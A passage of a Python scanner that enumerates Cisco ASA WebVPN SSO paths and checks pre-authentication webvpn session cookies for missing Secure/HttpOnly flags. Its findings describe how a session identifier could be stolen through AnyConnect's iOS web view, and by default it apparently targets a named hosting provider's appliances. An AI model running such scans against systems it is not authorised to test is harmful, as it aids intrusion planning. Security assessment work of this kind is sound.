    sso_paths = [
        '/+CSCOE+/sso/',
        '/+CSCOE+/sso/login',
        '/+CSCOE+/sso/saml',
        '/+CSCOE+/sso/oauth',
        '/+CSCOE+/sso/oidc',
        '/+CSCOE+/sso/token',
        '/+CSCOE+/sso/callback',
        '/+CSCOE+/sso/redirect',
    ]

    for sso_path in sso_paths:
        sc_s, body_s, hdrs_s = _get(sso_path)
        if sc_s is None:
            continue
        set_cookie_s = hdrs_s.get('Set-Cookie', '') or hdrs_s.get('set-cookie', '')
        loc_s = hdrs_s.get('Location', '') or hdrs_s.get('location', '')
        has_webvpn_s = bool(re.search(r'webvpn=', set_cookie_s, re.I))
        has_sso_content = bool(
            re.search(r'saml|oauth|oidc|sso|assertion|token|idp|redirect', body_s, re.I)
        )
        if sc_s in (200, 302) and (has_webvpn_s or has_sso_content or loc_s):
            sev_s = 'HIGH' if has_webvpn_s else ('MEDIUM' if has_sso_content else 'INFO')
            findings.append({
                'severity': sev_s,
                'title': 'SSO_PATH_ACTIVE',
                'detail': (
                    f'{sso_path} HTTP {sc_s} on {host}:{port}.  '
                    f'webvpn_cookie={has_webvpn_s}, '
                    f'sso_content={has_sso_content}, '
                    f'location={loc_s[:80]!r}.  '
                    f'SSO sub-path active; AnyConnect iOS WKWebView SSO handshake '
                    f'traverses this prefix; live paths enumerate the supported '
                    f'federation protocol and redirect flow.'
                ),
                'host': host,
                'port': port,
            })

    sc_l, body_l, hdrs_l = _get('/+CSCOE+/logon.html')
    all_set_cookies = []
    for hname, hval in hdrs_l.items():
        if hname.lower() == 'set-cookie':
            all_set_cookies.append(hval)
    webvpn_cookies = [c for c in all_set_cookies if re.search(r'webvpn=', c, re.I)]
    if sc_l in (200, 302) and webvpn_cookies:
        parsed = []
        for wc in webvpn_cookies[:4]:
            flags = {
                'secure': bool(re.search(r'\bSecure\b', wc, re.I)),
                'httponly': bool(re.search(r'\bHttpOnly\b', wc, re.I)),
                'samesite': (re.search(r'SameSite=([^;, ]+)', wc, re.I) or [None, 'unset'])[1],
            }
            parsed.append(flags)
        insecure = any(not f['secure'] or not f['httponly'] for f in parsed)
        sev_wc = 'HIGH' if insecure else 'MEDIUM'
        findings.append({
            'severity': sev_wc,
            'title': 'WEBVPN_SESSION_COOKIE_ISSUED_PREAUTH',
            'detail': (
                f'/+CSCOE+/logon.html HTTP {sc_l} on {host}:{port} issued '
                f'webvpn= cookie(s) before authentication.  '
                f'cookie_flags={parsed!r}.  '
                f'insecure_flags={insecure}.  '
                f'Pre-auth webvpn= cookie establishes session state; if Secure '
                f'or HttpOnly absent, cookie readable by JavaScript in the WKWebView '
                f'same-origin context — AnyConnect iOS embeds a WKWebView for the '
                f'clientless SSO portal, so JS executing in portal pages can '
                f'exfiltrate the session identifier before tunnel establishment.'
            ),
            'host': host,
            'port': port,
        })
    elif sc_l in (200, 302):
        all_cookies = [v for k, v in hdrs_l.items() if k.lower() == 'set-cookie']
        cookie_names = [re.match(r'([^=;, ]+)', c).group(1) for c in all_cookies if c]
        if cookie_names:
            findings.append({
                'severity': 'INFO',
                'title': 'LOGON_COOKIES_DETECTED',
                'detail': (
                    f'/+CSCOE+/logon.html HTTP {sc_l} on {host}:{port} '
                    f'set cookies: {cookie_names!r}.  '
                    f'No webvpn= cookie at pre-auth stage; session mechanism '
                    f'confirmed by cookie names above.'
                ),
                'host': host,
                'port': port,
            })

    return findings


if __name__ == '__main__':
    import sys
    host = sys.argv[1] if len(sys.argv) > 1 else None
    if host:
        enum = ASAEnumerator(host)
        enum.enumerate_all()
        print(enum.report())
    else:
        enumerate_macstadium_asas()
